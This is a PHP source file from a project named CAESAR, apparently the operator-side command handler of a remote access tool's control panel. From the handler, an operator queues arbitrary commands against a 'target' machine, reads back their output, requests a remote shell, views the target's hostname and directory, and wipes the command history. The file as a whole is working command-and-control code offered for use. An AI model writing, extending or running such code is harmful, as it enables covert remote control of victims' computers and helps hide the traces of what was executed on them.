<?php

	/*
		CAESAR

		Author : Michele '0blio' Cisternino
		Email  : miki.cisternino@gmail.com
		Github : https://github.com/0blio
	
		This project is released under the GPL 3 license. 	
	*/

	$command = trim($_GET['command']);
	$target = trim($_GET['target']);

	if ($command == 'back') {
		$output = 'back';

	// If the user want to add a task to the target's queue
	} else if (startswith($command, 'schedule')) {
		$task = trim(str_replace ('schedule', '', $command));

		if (!empty($task)) {
			// Generating a task identifier
			do {
				$task_id = random_string (6);
			} while ($db -> table ('tasks') -> eq ('task_id', $task_id) -> exists()); 

			$datetime = date("Y-m-d H:i:s");		
			if ($db -> table ('tasks') -> insert (['user_id' => $target, 'task_id' => $task_id, 'command' => $task, 'insertion_time' => $datetime]))
				$output = system_message ('Task successfully added to the queue', 'added');
			else
				$output = system_message ('Error', 'error');
		} else {
			$output = 'Usage: schedule COMMAND';
		}

	// If the user want the target's queue
	} else if ($command == 'queue') {
		$output = $db -> table ('tasks') -> columns ('command', 'insertion_time') -> eq ('user_id', $target) -> eq ('executed', 0) -> asc('insertion_time') -> findAll();
		if (count($output) > 0)
			$output = to_html_table ($output, ['Commands', 'Insertion time']);
		else
			$output = system_message ('Empty queue', 'notification');

	} else if ($command == 'flush queue') {
		$removed = $db -> table ('tasks') -> eq ('user_id', $target) -> eq ('executed', 0) -> remove();
		$output = system_message ('Queue deleted successfully', 'removed');

	// Possibilità di prendere gli ultimi 10 comandi
	} else if ($command == 'history') {
		// Dove il comando è diverso da connect o l'output è vuoto
		$output = $db -> table ('tasks') -> columns ('command', 'output', 'insertion_time', 'time_run') -> eq ('user_id', $target) -> eq ('executed', 1) -> asc('insertion_time') -> findAll();

		if (count($output) > 0) 
			$output = to_html_table ($output, ['Command', 'Output', 'Insertion time', 'Time run']);
	    else
			$output = system_message ('Empty history', 'notification');

	} else if ($command == 'clear history') {
		// Dove il comando è diverso da connect
		$db -> table ('tasks') -> eq ('user_id', $target) -> eq ('executed', 1) -> remove();
		$output = system_message ('History removed successfully', 'removed');

	// If the user wants a remote shell on the remote system
	} else if ($command == 'shell') {
		// Removing old connection requests
		$db -> table ('tasks') -> eq('user_id', $target) -> eq('command', 'connect') -> remove();

		// Removing old exit requests
		$db -> table ('tasks') -> eq('user_id', $target) -> eq('command', 'exit') -> remove();

		// Generating a task identifier
		do {
			$task_id = random_string (6);
		} while ($db -> table ('tasks') -> eq ('task_id', $task_id) -> exists()); 

		$datetime = date("Y-m-d H:i:s");

		// Inserting new connection request
		$db -> table ('tasks') -> insert(['task_id' => $task_id, 'user_id' => $target, 'command' => 'connect', 'insertion_time' => $datetime]);

		$output = 'shell';

	// If the user want to check if the connection has been enstablished
	} else if ($command == 'check connection') {

		// Checking if the target has sended a response to the previous connection request
		$connected = $db -> table ('tasks') -> eq('user_id', $target) -> eq('command', 'connect') -> eq('output', 'connected') -> exists();
		if ($connected) 
			$output = 'connected';
		else
			$output = 'not connected';

	// This commands request basic info on the target
	} else if ($command == 'title') {
		$info = $db -> table ('targets') -> columns ('hostname', 'username', 'working_directory') -> eq('id', $target) -> findAll();
		$output = set_text_color($info[0]['hostname'], '#c0392b') . ' ' . set_text_color ($info[0]['working_directory'] . ' # ', '#3498db');

	} else if ($command == 'help') {
		$output = $db -> table ('help') -> eq('category', 'o') -> columns('command', 'description') -> asc('description') -> findAll();
		$output = to_html_table ($output);

	} else {
		$output = htmlentities($command) . ': Command not found';
	} 
